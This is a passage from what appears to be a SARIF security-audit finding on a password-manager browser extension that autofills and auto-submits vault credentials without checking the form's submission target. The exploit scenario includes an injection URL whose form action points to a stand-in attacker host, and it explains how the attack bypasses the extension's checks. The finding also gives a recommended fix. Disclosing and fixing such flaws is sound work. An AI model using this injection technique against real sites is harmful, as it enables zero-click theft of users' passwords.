        {
          "ruleId": "CWE-346",
          "ruleIndex": 1,
          "level": "warning",
          "message": {
            "text": "Vault credentials are filled and auto-submitted without checking where the form sends them (form action / formaction).\n\nThe content script and worker decide whether vault secrets may be released using only the document's origin and path (content.ts:799-803, identify() in runtime.ts). Nothing checks the origin the credentials will be submitted to: form.action, the click target's formaction, or a <base href> are never read (grep finds no action/formaction check in apps/extension/src). The secret is written into a page-controlled form (content.ts:998/1022) and then the recipe's submit target is clicked (content.ts:1112), so markup on the page decides where the password goes.\n\nImpact: Zero-click theft of the site's vault credentials (username and password, or TOTP and hidden fields bound to the recipe) from a markup-only injection that without Pateat would need the user to type the password.\n\nExploit scenario: Victim has Pateat with a Bitwarden item for https://victim.com. The site has a script-less HTML injection, e.g. a reflected error parameter on /login, or markup blocked from running scripts by CSP. The attacker sends a link like https://victim.com/login?msg=<form action=https://evil.example/c>. The HTML parser ignores the real <form> start tag while the injected form element pointer is set, so the real username/password inputs and the submit button now belong to the attacker's form. The cached recipe's targets (id/name/text) still match exactly one element each, so the fields-split, secret-refused and unreadyForm checks all pass. Pateat fills the vault username and password and clicks the submit button, and the browser POSTs them to evil.example with no user action. Variant: an injected fake password form on any other path of the origin makes the page qualify for automatic recipe generation (showsSignIn). The generated recipe then fills and submits the item's password into that form.\n\nPreconditions: The target site has an HTML injection that allows a <form> or formaction/base markup (scripts not required); The victim has a vault item whose URI matches the site, with either a cached recipe for the injected path or recipe generation connected; The victim opens the attacker's link.\n\nRecommendation: Before filling secrets and before the submitting click, resolve the effective submission URL (the button's formAction if set, else form.action; for a form-less click, refuse or require the step to be a non-submit). Refuse when its origin differs from the document origin, or at least when it is not covered by the item's URI match. Also refuse when the form's action differs from what the recipe recorded when it was generated or cached.\n\nCWE-346. Severity MEDIUM, confidence medium."
          },
